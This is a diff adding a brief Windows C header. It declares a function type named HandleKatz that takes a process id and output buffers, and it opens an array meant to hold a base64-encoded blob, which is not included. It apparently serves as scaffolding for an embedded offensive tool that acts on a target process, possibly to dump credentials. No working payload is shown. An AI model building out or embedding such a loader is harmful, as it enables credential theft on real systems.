@@ -1,0 +1,8 @@
+#pragma once
+
+#include "windows.h"
+#include <stdint.h>
+
+typedef DWORD(HandleKatz)(BOOL b_recon_only, char* ptr_output, uint32_t pid,  char* ptr_stdout);
+char handlekatz_b64[] =
+/* base64-encoded blob below */
